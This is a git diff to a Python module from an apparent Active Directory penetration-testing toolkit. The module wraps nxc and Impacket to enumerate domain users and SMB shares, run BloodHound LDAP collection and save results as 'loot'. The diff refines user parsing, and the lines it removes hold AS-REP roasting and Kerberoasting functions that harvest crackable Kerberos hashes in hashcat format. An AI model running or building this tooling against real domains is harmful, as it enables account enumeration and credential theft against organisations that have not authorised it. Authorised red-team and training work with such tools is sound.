@@ -2,6 +2,7 @@
 
 import os
 import shutil
+import re
 from core.helpers import run_command, save_loot
 from core.colors import blue, green, yellow, red
 
@@ -9,11 +10,8 @@ def enum_users(session, save=False):
     print(blue("[*] Extracting domain users via SMB (nxc)..."))
 
     if not shutil.which("nxc"):
-        print(red("[-] 'nxc' not found in PATH. Please install it."))
+        print(red("[-] 'nxc' not found in PATH."))
         return
-
-    raw_output = f"raw_users_{session.target_ip}.txt"
-    parsed_output = "valid_users.txt"
 
     cmd = f"nxc smb {session.target_ip} -u \"{session.username}\""
     if session.hash:
@@ -25,26 +23,39 @@ def enum_users(session, save=False):
     cmd += " --users"
 
     out, err = run_command(cmd)
-
-    if save:
-        save_loot(raw_output, out or err)
+    if not out:
+        print(red("[!] No output returned. Check credentials or target."))
+        return
 
     users = []
-    for line in out.splitlines():
-        parts = line.split()
-        if len(parts) >= 5 and parts[0].lower().startswith("smb"):
-            users.append(parts[4])
+    found_header = False
 
-    unique_users = sorted(set(users))
+    for line in out.splitlines():
+        # Wait until the listing header appears
+        if "-Username-" in line and "-Last PW Set-" in line:
+            found_header = True
+            continue
+
+        if found_header:
+            parts = line.split()
+            if len(parts) >= 2:
+                user = parts[4] if len(parts) >= 5 else parts[0]
+                if user.lower() not in ["administrator", "guest", "krbtgt"]:  # optional
+                    users.append(user)
+
+    unique_users = sorted(set(users), key=lambda x: x.lower())
     if unique_users:
         for u in unique_users:
             print(green(f"[+] User: {u}"))
         if save:
-            with open(f"loot/{parsed_output}", "w") as f:
+            with open("loot/valid_users.txt", "w") as f:
                 f.writelines([u + "\n" for u in unique_users])
-            print(yellow(f"[+] Saved to: loot/{parsed_output}"))
+            print(yellow("[+] Saved to loot/valid_users.txt"))
     else:
         print(red("[-] No usernames extracted."))
+        if err:
+            print(yellow(err.strip()))
+
 
 def enum_shares(session, save=False):
     print(blue("[*] Enumerating SMB shares via nxc..."))
@@ -67,52 +78,6 @@ def enum_shares(session, save=False):
     if save:
         save_loot(f"smb_shares_{session.target_ip}.txt", out or err)
 
-def enum_asrep(session, save=False):
-    print(blue("[*] Running AS-REP Roasting..."))
-
-    if not shutil.which("impacket-GetNPUsers"):
-        print(red("[-] impacket-GetNPUsers not found in PATH. Install Impacket."))
-        return
-
-    userfile = "loot/valid_users.txt"
-    if not os.path.exists(userfile):
-        print(red("[-] valid_users.txt not found. Run `attack authenum users save` first."))
-        return
-
-    cmd = f"impacket-GetNPUsers {session.domain}/ -dc-ip {session.dc_ip} -usersfile {userfile} -format hashcat"
-    out, err = run_command(cmd)
-
-    if "$krb5asrep$" in out:
-        print(green("[+] AS-REP hashes found!"))
-        print(out.strip())
-        if save:
-            save_loot("asrep_hashes.txt", out)
-    else:
-        print(yellow("[*] No AS-REP roastable users found."))
-        print(err.strip())
-
-def enum_kerberoast(session, save=False):
-    print(blue("[*] Running Kerberoasting..."))
-
-    if not shutil.which("impacket-GetNPUsers"):
-        print(red("[-] impacket-GetNPUsers not found in PATH. Install Impacket."))
-        return
-
-    if session.hash:
-        print(red("[-] Kerberoasting requires a password, not a hash."))
-        return
-
-    cmd = f"impacket-GetNPUsers -request -dc-ip {session.dc_ip} {session.domain}/{session.username}:'{session.password}'"
-    out, err = run_command(cmd)
-
-    if "$krb5tgs$" in out:
-        print(green("[+] Kerberoastable accounts found!"))
-        print(out.strip())
-        if save:
-            save_loot("kerberoast_hashes.txt", out)
-    else:
-        print(yellow("[*] No Kerberoastable users found."))
-        print(err.strip())
 
 def enum_bloodhound(session, save=False):
     print(blue("[*] Running BloodHound LDAP collection via nxc..."))
@@ -134,5 +99,7 @@ def enum_bloodhound(session, save=False):
     out, err = run_command(cmd)
     combined = out + "\n" + err
     print(combined.strip())
-    # Try to detect the resulting .zip file
 
+    for line in combined.splitlines():
+        if ".zip" in line and "bloodhound" in line.lower():
+            print(green(f"[+] BloodHound file: {line.strip()}"))
